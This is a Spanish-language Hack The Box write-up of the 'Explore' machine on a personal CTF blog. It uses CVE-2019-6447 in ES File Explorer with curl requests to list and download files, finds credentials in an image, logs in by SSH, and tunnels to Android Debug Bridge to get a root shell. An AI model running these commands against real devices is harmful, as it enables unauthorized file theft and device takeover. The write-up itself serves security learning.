<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D}</style><title>Explore</title><meta name=description content="wannabe | CTF Player"><meta name=keywords content="Bas1cTF,HTB,writeup,htb,writeups"><meta property="og:url" content="https://bas1ctf.github.io/posts/explore/"><meta property="og:type" content="website"><meta property="og:title" content="Explore"><meta property="og:description" content="wannabe | CTF Player"><meta property="og:image" content="/images/avatar.jpg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="Explore"><meta name=twitter:description content="wannabe | CTF Player"><meta property="twitter:domain" content="https://bas1ctf.github.io/posts/explore/"><meta property="twitter:url" content="https://bas1ctf.github.io/posts/explore/"><meta name=twitter:image content="/images/avatar.jpg"><link rel=canonical href=https://bas1ctf.github.io/posts/explore/><link rel=stylesheet type=text/css href=https://bas1ctf.github.io//css/normalize.min.css media=print onload='this.media="all"'><link rel=stylesheet type=text/css href=https://bas1ctf.github.io//css/main.css><link disabled id=dark-theme rel=stylesheet href=https://bas1ctf.github.io//css/dark.css><script src=https://bas1ctf.github.io//js/svg-injector.min.js></script>
<script src=https://bas1ctf.github.io//js/feather-icons.min.js></script>
<script src=https://bas1ctf.github.io//js/main.js></script></head><body><script type=text/javascript>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://bas1ctf.github.io/><img src=https://bas1ctf.github.io//images/avatar.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://bas1ctf.github.io/>Bas1cTF</a></div><div class=nav-links><div class=nav-link><a href=https://bas1ctf.github.io/><span data-feather=home></span> Home</a></div><div class=nav-link><a href=https://bas1ctf.github.io/posts/><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://bas1ctf.github.io/tags/><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://github.com/Bas1cTF><span data-feather=github></span></a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only></span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><a><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://bas1ctf.github.io/><span data-feather=home></span> Home</a></li><li class=nav-item><a href=https://bas1ctf.github.io/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://bas1ctf.github.io/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://github.com/Bas1cTF><span data-feather=github></span></a></li><li class="nav-item dark-theme-toggle"><span id=dark-theme-toggle-screen-reader-target class=sr-only>theme</span>
<a><span id=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>Explore</h1><small role=doc-subtitle></small><p class=post-date>agosto 28, 2022</p><ul class=post-tags><li class=post-tag><a href=https://bas1ctf.github.io/tags/htb>htb</a></li><li class=post-tag><a href=https://bas1ctf.github.io/tags/writeups>writeups</a></li></ul></div><div class=post-content><p><p>He regresado por la revancha</p><ul><li>puerto 2222 ssh</li><li>puerto 42135 ES File Explorer</li><li>puerto 42935 unknown</li><li>puerto 59777 Bukkit</li></ul><p>Al tener expuesto el puerto 59777 se sabe que es vulnerable la versión de ES File Explorer al CVE-2019-6447.</p><p>Podemos enviar peticiones al puerto 59777 con un comando a ejecutar por medio de json, por ejemplo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>curl http://$TARGET:59777/ -d <span style=color:#e6db74>&#34;{&#39;command&#39;:listFiles}&#34;</span>
</span></span></code></pre></div><p>Los comandos aceptados son los siguientes:</p><ul><li>listFiles</li><li>listPics</li><li>listVideos</li><li>listAudios</li><li>listApps</li><li>listAppsSystem</li><li>listAppsPhone</li><li>listAppsSdcard</li><li>listAppsAll</li><li>getDeviceInfo</li></ul><p>Listando las imagenes encontramos una llamada <code>creds.jpg</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-JSON data-lang=JSON><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>{</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;creds.jpg&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;time&#34;</span>:<span style=color:#e6db74>&#34;4/21/21 02:38:18 AM&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;location&#34;</span>:<span style=color:#e6db74>&#34;/storage/emulated/0/DCIM/creds.jpg&#34;</span>, 
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;size&#34;</span>:<span style=color:#e6db74>&#34;1.14 MB (1,200,401 Bytes)&#34;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}</span>
</span></span></code></pre></div><p>Para obtener la imagen simplemente hacemos una petición GET al path completo de la imagen.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>curl http://$TARGET:59777/storage/emulated/0/DCIM/creds.jpg -o creds.jpg
</span></span></code></pre></div><p>La imagen contiene credenciales, las cuales probamos para conectarnos por medio de SSH.</p><p>Si no se puede establecer la conexión modificar el archivo <code>~/.ssh/config</code> con lo siguiente</p><pre tabindex=0><code>host 10.10.10.247
    HostkeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
</code></pre><p>Observando los puertos disponibles encontramos el puerto 5555, correspondiente al debugger en android, entonces podemos hacer un tunnel a tráves de ssh para así interactuar con la herramienta adecuada.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>ssh kristi@10.10.10.247 -p <span style=color:#ae81ff>2222</span> -L 5555:localhost:5555
</span></span></code></pre></div><p>Ya en nuestro terminal podemos conectarnos mediante adb</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-BASH data-lang=BASH><span style=display:flex><span>adb connect &lt;IP&gt;
</span></span><span style=display:flex><span>adb root <span style=color:#75715e># Intentamos escalar a root</span>
</span></span><span style=display:flex><span>adb shell
</span></span></code></pre></div><p>La flag la encontramos en el directorio <code>/data</code></p><h2 id=referencia>Referencia</h2><p><a href=https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge>Port 5555 - HackTricks</a></p></p></div></div></main><footer class=footer><span>&copy; 2022 YmFzMWNU</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/526avijitgupta/gokarna>Gokarna</a></span></footer></body></html>